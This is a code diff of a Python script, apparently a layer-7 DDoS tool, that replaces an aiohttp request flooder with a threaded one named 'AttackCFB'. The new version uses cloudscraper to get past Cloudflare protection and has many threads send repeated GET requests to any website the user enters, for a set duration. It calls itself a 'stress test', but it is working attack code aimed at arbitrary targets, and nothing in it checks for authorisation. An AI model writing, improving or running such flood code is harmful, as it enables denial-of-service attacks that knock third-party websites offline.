@@ -1,27 +1,24 @@
-import aiohttp
-import asyncio
+import datetime
+import threading
+import cloudscraper
 
-async def stress_test(url, num_requests, session):
-    tasks = []
-    for i in range(num_requests):
-        if i % 2 == 0:
-            tasks.append(session.get(url))
-        else:
-            tasks.append(session.head(url))
-    await asyncio.gather(*tasks)
+def LaunchCFB():
+    url = input("Enter the target website: ")
+    t = input("Enter the duration of the stress test in seconds: ")
+    th = input("Enter the number of threads to use: ")
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
 
-async def main(num_requests):
-    url = input("Enter the website URL (including http or https): ")
-    duration = int(input("Enter the duration of the stress test in seconds: "))
-    connector = aiohttp.TCPConnector(limit=0)
-    timeout = aiohttp.ClientTimeout(total=0)
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        start_time = asyncio.get_event_loop().time()
-        while asyncio.get_event_loop().time() - start_time < duration:
-            print(f"Sending {num_requests} requests")
-            await stress_test(url, num_requests, session)
-            await asyncio.sleep(1)
-
-if __name__ == '__main__':
-    num_requests = 10000
-    asyncio.run(main(num_requests))
+def AttackCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url, timeout=15)
+            scraper.get(url, timeout=15)
+        except:
+            pass
